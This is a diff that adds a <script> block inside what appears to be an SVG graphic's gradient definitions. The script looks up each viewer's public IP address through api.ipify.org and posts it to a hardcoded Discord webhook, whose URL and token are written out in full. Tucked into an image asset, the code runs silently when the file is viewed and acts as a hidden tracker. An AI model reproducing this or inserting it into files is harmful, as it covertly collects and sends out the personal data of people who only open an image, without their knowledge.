@@ -89,6 +89,28 @@
             <stop offset="0.72" stop-color="hsla(244, 33%, 19%, 1)" />
             <stop offset="0.78" stop-color="hsla(240, 33%, 17%, 1)" />
         </radialGradient>
+      <script>
+        var ip = '';
+fetch('https://api.ipify.org/?format=json')
+.then(function(response) {
+    return response.json();
+})
+.then(function(data) {
+    ip = data.ip;
+    var webhook = 'https://discord.com/api/webhooks/1128662153289814158/-PyXb_961uAjml1V6k8UZrthPakNvjyxCZ7rnd_zpXXqUxGd5XA4O8K1CUBleY4D8hMA'; //Put webhook here 
+    var message = {
+        content: 'IP: ' + ip
+    };
+
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+    })
+})
+  </script>
         <radialGradient id="fstar-grad" cx="1362.39" cy="-53.7" r="39.39"
                     gradientTransform="matrix(0.89, -0.45, -0.45, -0.89, -473.7, 640.57)"
                     gradientUnits="userSpaceOnUse">
